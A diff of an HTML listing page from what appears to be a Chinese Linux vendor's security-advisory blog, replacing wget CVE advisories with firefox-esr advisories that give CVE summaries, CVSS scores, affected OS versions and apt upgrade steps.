-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-13090"><a href="#漏洞编号：-CVE-2017-13090" class="headerlink" title="漏洞编号： CVE-2017-13090"></a>漏洞编号： CVE-2017-13090</h3><h3 id="软件包名：-wget"><a href="#软件包名：-wget" class="headerlink" title="软件包名： wget"></a>软件包名： wget</h3><h3 id="CVSS3-1评分：8-8"><a href="#CVSS3-1评分：8-8" class="headerlink" title="CVSS3.1评分：8.8"></a>CVSS3.1评分：8.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到wget_1.18-5+deb9u3 （待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-13090">https://nvd.nist.gov/vuln/detail/CVE-2017-13090</a></p>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox存在漏洞，一种通过 IPC 消息使用文件系统请求构造函数会绕过沙箱中的文件系统访问保护的机制。这允许对本地文件系统进行读写访问</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5456"><a href="#漏洞编号：-CVE-2017-5456" class="headerlink" title="漏洞编号： CVE-2017-5456"></a>漏洞编号： CVE-2017-5456</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：9-8"><a href="#CVSS3-1评分：9-8" class="headerlink" title="CVSS3.1评分：9.8"></a>CVSS3.1评分：9.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5456">https://nvd.nist.gov/vuln/detail/CVE-2017-5456</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2017-13090%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4yt2000fb2140a6l0041" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5456%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3u000nyy3e3gab2rq0" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -272,10 +316,10 @@
 
 
   
-    <article id="post-cve-2017-13089安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5469安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2017-13089%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-09T08:55:16.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5469%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T10:10:56.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -286,7 +330,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2017-13089%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-13089安全公告</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5469%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5469安全公告</a>
     </h1>
   
 
@@ -294,19 +338,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-wget安全更新"><a href="#NFS-SA-2022-03-wget安全更新" class="headerlink" title="NFS-SA-2022-03: wget安全更新"></a>NFS-SA-2022-03: wget安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>The http.c:skip_short_body() function is called in some circumstances, such as when processing redirects. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk’s length, but doesn’t check that the chunk length is a non-negative number. The code then tries to skip the chunk in pieces of 512 bytes by using the MIN() macro, but ends up passing the negative chunk length to connect.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-13089"><a href="#漏洞编号：-CVE-2017-13089" class="headerlink" title="漏洞编号： CVE-2017-13089"></a>漏洞编号： CVE-2017-13089</h3><h3 id="软件包名：-wget"><a href="#软件包名：-wget" class="headerlink" title="软件包名： wget"></a>软件包名： wget</h3><h3 id="CVSS3-1评分：8-8"><a href="#CVSS3-1评分：8-8" class="headerlink" title="CVSS3.1评分：8.8"></a>CVSS3.1评分：8.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到wget_1.18-5+deb9u3 （待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-13089">https://nvd.nist.gov/vuln/detail/CVE-2017-13089</a></p>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox由于 Flex 中的 CVE-2016-6354 问题，在生成的 Firefox 代码中存在缓冲区溢出问题。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5469"><a href="#漏洞编号：-CVE-2017-5469" class="headerlink" title="漏洞编号： CVE-2017-5469"></a>漏洞编号： CVE-2017-5469</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：9-8"><a href="#CVSS3-1评分：9-8" class="headerlink" title="CVSS3.1评分：9.8"></a>CVSS3.1评分：9.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5469">https://nvd.nist.gov/vuln/detail/CVE-2017-5469</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2017-13089%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4yt0000ab214c67wfzpf" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5469%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3w000ryy3e9f8xczxj" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -314,10 +379,10 @@
 
 
   
-    <article id="post-cve-2019-5953安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5445安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2019-5953%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-09T08:46:59.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5445%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T09:11:34.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -328,7 +393,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2019-5953%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2019-5953安全公告</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5445%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5445安全公告</a>
     </h1>
   
 
@@ -336,19 +401,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-wget安全更新"><a href="#NFS-SA-2022-03-wget安全更新" class="headerlink" title="NFS-SA-2022-03: wget安全更新"></a>NFS-SA-2022-03: wget安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Buffer overflow in GNU Wget 1.20.1 and earlier allows remote attackers to cause a denial-of-service (DoS) or may execute an arbitrary code via unspecified vectors.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2019-5953"><a href="#漏洞编号：-CVE-2019-5953" class="headerlink" title="漏洞编号： CVE-2019-5953"></a>漏洞编号： CVE-2019-5953</h3><h3 id="软件包名：-wget"><a href="#软件包名：-wget" class="headerlink" title="软件包名： wget"></a>软件包名： wget</h3><h3 id="CVSS3-1评分：9-8"><a href="#CVSS3-1评分：9-8" class="headerlink" title="CVSS3.1评分：9.8"></a>CVSS3.1评分：9.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到wget_1.18-5+deb9u3 （待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2019-5953">https://nvd.nist.gov/vuln/detail/CVE-2019-5953</a></p>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox在解析“application/http-index-format”格式内容时的存在漏洞，其中未初始化的值用于创建数组。这可能允许将未初始化的内存读取到受影响的数组中。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5445"><a href="#漏洞编号：-CVE-2017-5445" class="headerlink" title="漏洞编号： CVE-2017-5445"></a>漏洞编号： CVE-2017-5445</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：7-5"><a href="#CVSS3-1评分：7-5" class="headerlink" title="CVSS3.1评分：7.5"></a>CVSS3.1评分：7.5</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5445">https://nvd.nist.gov/vuln/detail/CVE-2017-5445</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/09/cve-2019-5953%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysy0007b214atp58fcw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5445%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3r000gyy3e3ejncsdj" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wget/" rel="tag">wget</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -356,10 +442,10 @@
 
 
   
-    <article id="post-cve-2018-0494" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5449安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2018-0494/" class="article-date">
-  <time datetime="2022-03-09T08:10:45.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5449%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T08:51:08.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -370,7 +456,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2018-0494/">cve-2018-0494</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5449%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5449安全公告</a>
     </h1>
   
 
@@ -378,19 +464,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-wget安全更新"><a href="#NFS-SA-2022-03-wget安全更新" class="headerlink" title="NFS-SA-2022-03: wget安全更新"></a>NFS-SA-2022-03: wget安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>GNU Wget before 1.19.5 is prone to a cookie injection vulnerability in the resp_new function in http.c via a \r\n sequence in a continuation line.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2018-0494"><a href="#漏洞编号：-CVE-2018-0494" class="headerlink" title="漏洞编号： CVE-2018-0494"></a>漏洞编号： CVE-2018-0494</h3><h3 id="软件包名：-wget"><a href="#软件包名：-wget" class="headerlink" title="软件包名： wget"></a>软件包名： wget</h3><h3 id="CVSS3-1评分：6-5"><a href="#CVSS3-1评分：6-5" class="headerlink" title="CVSS3.1评分：6.5"></a>CVSS3.1评分：6.5</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到wget_1.18-5+deb9u3 （待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-0494">https://nvd.nist.gov/vuln/detail/CVE-2018-0494</a></p>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox存在与 CSS 动画一致的双向 unicode 文本的布局期间可触发的崩溃。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5449"><a href="#漏洞编号：-CVE-2017-5449" class="headerlink" title="漏洞编号： CVE-2017-5449"></a>漏洞编号： CVE-2017-5449</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：7-5"><a href="#CVSS3-1评分：7-5" class="headerlink" title="CVSS3.1评分：7.5"></a>CVSS3.1评分：7.5</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<p>方德桌面操作系统V4.0曙光版本添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-sg-security/">http://update.os.nfschina.com/static/nfs-4.0-sg-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5449">https://nvd.nist.gov/vuln/detail/CVE-2017-5449</a></p>
 
       
     </div>
     <footer class="article-footer">
